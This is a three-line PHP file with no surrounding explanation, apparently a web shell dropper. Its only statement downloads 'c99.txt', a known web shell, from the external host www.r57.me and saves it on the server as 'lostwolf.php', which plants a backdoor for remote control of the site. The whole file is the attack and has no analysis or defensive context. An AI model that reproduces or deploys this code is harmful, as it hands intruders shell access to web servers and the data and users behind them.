<?php
echo copy("http://www.r57.me/c99.txt","lostwolf.php");
?> 